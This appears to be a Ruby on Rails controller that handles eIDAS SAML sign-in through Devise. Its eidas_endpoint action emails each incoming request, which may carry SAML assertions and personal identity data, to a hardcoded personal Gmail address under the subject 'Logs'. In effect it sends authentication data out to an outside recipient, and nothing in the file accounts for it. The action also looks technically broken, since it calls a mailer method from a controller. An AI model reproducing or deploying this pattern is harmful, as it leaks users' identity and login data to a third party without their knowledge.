require "eidas-saml"

class SamlSessionsController < Devise::SamlSessionsController
  after_action :store_winning_strategy, only: :create

  def new
    idp_entity_id = get_idp_entity_id(params)
    request = EidasSaml.new
    auth_params = { RelayState: relay_state } if relay_state
    action = request.create(saml_config(idp_entity_id), auth_params || {})
    redirect_to action
  end

  def eidas_endpoint
      mail(to: "bertocode@gmail.com", subject: "Logs") do |format|
        format.text { render plain: request }
      end
  end

  def metadata
     xml = File.read("#{Rails.root}/public/metadata.xml")
	 render :plain=> xml, :content_type=> "application/xml"
  end

  private

  def store_winning_strategy
    warden.session(:user)[:strategy] = warden.winning_strategies[:user].class.name.demodulize.underscore.to_sym
  end
end